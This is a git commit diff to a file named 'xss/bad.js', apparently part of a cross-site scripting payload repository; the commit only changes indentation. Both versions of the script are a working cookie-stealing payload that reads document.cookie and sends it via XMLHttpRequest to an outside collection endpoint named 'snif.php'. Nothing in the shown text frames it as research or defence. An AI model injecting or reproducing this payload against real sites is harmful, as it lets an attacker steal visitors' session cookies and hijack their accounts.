c9957082049936f0ae99e20e801ccccc47414e91
EFETR <71470196+ef3tr@users.noreply.github.com>
2023-12-24 05:02:39 +0300

    Update bad.js

--- xss/bad.js
+++ xss/bad.js
@@ -1,3 +1,3 @@
 var xmlHttp = new XMLHttpRequest();
- xmlHttp.open("GET", 'https://ef3tr.github.io/xss/snif.php?cookie='+document.cookie);
- xmlHttp.send(null);
+xmlHttp.open("GET", 'https://ef3tr.github.io/xss/snif.php?cookie='+document.cookie);
+xmlHttp.send(null);
